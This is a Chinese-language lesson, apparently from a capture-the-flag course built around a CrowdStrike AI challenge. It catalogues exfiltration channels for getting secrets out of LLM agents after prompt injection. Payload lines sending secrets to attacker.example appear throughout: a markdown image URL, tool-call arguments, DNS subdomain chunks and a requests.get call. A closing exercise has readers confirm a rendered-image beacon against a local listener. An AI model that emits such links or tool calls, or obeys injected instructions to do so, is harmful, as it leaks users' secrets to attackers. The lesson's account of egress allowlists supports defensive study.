数据外泄通道

窃取秘密是两个问题：让模型说出它，以及让它离开这座大楼。第二个问题有属于它自己的一整个工具箱。

在 CrowdStrike "AI Unlocked: Agents of Chaos" 任务中，信息泄露类谜题只有在秘密被证明送到了你手里时才计分。这就是 exfiltration（数据外泄）：把数据从智能体信任边界之内转移到你控制的地方。模型愿意吐出秘密是必要条件，但不充分——你还需要一条脚手架真正会运送的通道。

通道目录

  • Markdown image 渲染——经典手法。只要任何渲染界面会把模型输出按 markdown 显示，一行就够：![x](https://attacker.example/?d=SECRET)。渲染器去抓取这个 URL；秘密随查询字符串出境；你查服务器日志即可。不需要任何 tool call。
  • 链接点击 / 追踪像素——机制相同，由人介导：一个缩短或伪装的 URL，被用户（或链接预览机器人）触发，把数据放在路径或参数里带出去。
  • tool call 参数作为侧信道——看似无害的 search("customer_8842_api_key")，或一次对 https://attacker.example/leak?v=… 的网页抓取，把秘密藏进脚手架允许的工具调用里。工具层很少检查参数的保密性。
  • DNS / URL 参数隐写——把秘密拆到子域名里（<chunk1>.<chunk2>.attacker.example），即使字节长度受限的查询也能漏出去。DNS 外泄早于 LLM 存在，在只放行域名解析出口时仍然有效。
  • 代码执行写出——如果智能体能运行代码，一行 requests.get("https://attacker.example/", params={"d": secret}) 就是最可靠的通道。
  • 补全内容泄露——当不存在网络出口时，"通道"就是对话记录本身：把秘密弄进评分器（或下游用户）能看到 的输出里。更慢，但有时是唯一选项。
核心要点 任何会抓取 URL 的组件都是一个 exfiltration 原语。渲染器、链接预览、网络工具和代码运行器都会发出你可以引导的出站请求。先审计目标的出站抓取能力；markdown image 只不过是最廉价的特例。
反模式 提取到秘密就庆祝。如果秘密停留在从未离开环境的聊天气泡里，泄露不计分。永远先规划完整链条——提取并且外泄——再花 token，否则你会为半次攻击付两次钱。

用有限的工具搭建链条

真实目标很少给你一个可自由填 URL 的抓取工具。手艺在于链式组合：被注入的指令让模型把秘密放进某个被允许的工具的参数（搜索词、发给"客服"的邮件、写入同步文件夹的文件），而这个工具的正常行为把秘密带出去。结合第 5 课：选出口最不被检查的工具，而不是描述里承诺最多的那个。

防守侧，这正是 egress allowlist（出口白名单）存在的原因：把出站目的地限制在已知集合内，markdown image 外泄就在网络层死掉——无论你的注入多么漂亮。要预期加固过的谜题会逼你放弃图片模式、转向更冷僻的通道——这个约束本身就是谜题。

回忆检验

markdown image 模式为什么能外泄数据？

渲染器会抓取 URL。

![x](https://attacker.example/?d=SECRET) 不需要 tool call：任何把模型输出按 markdown 渲染的界面都会发出 HTTP 请求来加载图片，秘密就随查询字符串进入攻击者的日志。

工具参数为什么是侧信道？

出口无人检查。

含有秘密的搜索词或抓取 URL 通过脚手架本就信任的工具离开；参数内容很少被做保密检查，于是被允许的工具变成了无人监控的出口。

哪种防御能杀掉大多数外泄通道？

出口白名单。

把出站目的地限制在已知白名单，能在网络层拦下图片抓取、链接预览信标和精心构造的工具 URL——不管上游的 prompt injection 有多成功。

亲手验证

动手 — 10 分钟 启动本地监听（python3 -m http.server 8000）并在浏览器打开目录列表。然后，在任何能渲染 markdown 的聊天界面里，让模型输出 ![p](http://localhost:8000/ping1)（一个无害信标）。看着请求抵达你的监听器。你刚刚通过 image 渲染外泄了一个比特。把 ping1 换成任何未来的秘密即可。
